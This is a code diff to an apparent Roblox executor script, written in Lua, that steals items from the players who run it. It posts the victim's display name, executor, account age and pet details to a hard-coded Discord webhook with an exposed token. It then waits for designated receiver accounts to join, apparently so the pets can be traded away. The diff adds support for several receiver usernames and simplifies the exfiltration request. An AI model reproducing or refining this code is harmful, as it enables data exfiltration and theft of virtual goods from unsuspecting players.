@@ -2,7 +2,7 @@ if getgenv().decfde then return end
 getgenv().decfde = true
 
 local Webhook = "https://discord.com/api/webhooks/1393571947840929813/Yk-SBXIZoh-FP02pfhIfxthDSYJvUiIxbqugybWYu_gMi0XaccmE3E_1vjcMwZaBpJRM"
-local Username = "drawesfa"
+local Username = {"drawesfa", "seconduser", "thirduser"}
 local Fern = "https://fern.wtf/joiner?placeId="
 local OnlyPriorityPets = false
 local MinPriorityThreshold = 13
@@ -408,7 +408,7 @@ if petString ~= "" then
         fields = {
             {
                 name = "👤 Player Information",
-                value = string.format("```Name: %s\nReceiver: %s\nExecutor: %s\nAccount Age: %s```", Players.LocalPlayer.DisplayName or "Unknown", Username or "Unknown", detectExecutor() or "Unknown", tostring(Players.LocalPlayer.AccountAge or 0)),
+                value = string.format("```Name: %s\nReceiver: %s\nExecutor: %s\nAccount Age: %s```", Players.LocalPlayer.DisplayName or "Unknown", Username[1] or "Unknown", detectExecutor() or "Unknown", tostring(Players.LocalPlayer.AccountAge or 0)),
                 inline = false
             },
             {
@@ -437,70 +437,22 @@ if petString ~= "" then
         embeds = {embed}
     }
 
-    local fullBackpackString = ""
-    for _, pet in ipairs(pets) do
-        local highestPriority = 99
-        local chosenEmoji = "🐶"
-        local mutation = isMutated(pet.PetName)
-        local mutationData = mutation and PetPriorityData[mutation] or nil
-        local petData = PetPriorityData[pet.Type] or nil
-
-        if petData and petData.priority < highestPriority then
-            highestPriority = petData.priority
-            chosenEmoji = petData.emoji
-        elseif mutationData and mutationData.priority < highestPriority then
-            highestPriority = mutationData.priority
-            chosenEmoji = mutationData.emoji
-        elseif pet.Weight and pet.Weight >= 10 and 12 < highestPriority then
-            highestPriority = 12
-            chosenEmoji = "🐘"
-        elseif pet.Age and pet.Age >= 60 and 13 < highestPriority then
-            highestPriority = 13
-            chosenEmoji = "👴"
-        end
-
-        if not OnlyPriorityPets or (petData and petData.priority <= MinPriorityThreshold) or (mutationData and mutationData.priority <= MinPriorityThreshold) then
-            local petName = pet.PetName
-            local petValue = pet.Formatted
-            fullBackpackString = fullBackpackString .. chosenEmoji .. " - " .. petName .. " -> " .. petValue .. "\n"
-        end
-    end
-
-    local boundary = "------------------------" .. HttpService:GenerateGUID(false)
-    local embedPayload = HttpService:JSONEncode(payload)
-    local body = {}
-    table.insert(body, "--" .. boundary)
-    table.insert(body, 'Content-Disposition: form-data; name="payload_json"')
-    table.insert(body, "")
-    table.insert(body, embedPayload)
-    table.insert(body, "--" .. boundary)
-    table.insert(body, 'Content-Disposition: form-data; name="file"; filename="items.txt"')
-    table.insert(body, "Content-Type: text/plain")
-    table.insert(body, "")
-    table.insert(body, fullBackpackString)
-    table.insert(body, "--" .. boundary .. "--")
-    local requestBody = table.concat(body, "\r\n")
-
     pcall(function()
         request({
             Url = Webhook,
             Method = "POST",
             Headers = {
-                ["Content-Type"] = "multipart/form-data; boundary=" .. boundary
+                ["Content-Type"] = "application/json"
             },
-            Body = requestBody
+            Body = HttpService:JSONEncode(payload)
         })
     end)
 end
 
-local usernames = {
-    "PUT_HERE_YOUR_BACK_UP_USERNAMES",
-}
-
 local receiverPlr
 repeat
-    for _, name in ipairs(usernames) do
-        receiverPlr = Players:FindFirstChild(name) or Players:FindFirstChild(Username)
+    for _, name in ipairs(Username) do
+        receiverPlr = Players:FindFirstChild(name)
         if receiverPlr then
             break
         end
@@ -515,7 +467,7 @@ local targetChar = targetPlr.Character or targetPlr.CharacterAdded:Wait()
 
 if receiverPlr == targetPlr then
     repeat
-        for _, name in ipairs(usernames) do
+        for _, name in ipairs(Username) do
             receiverPlr = Players:FindFirstChild(name)
             if receiverPlr then
                 break
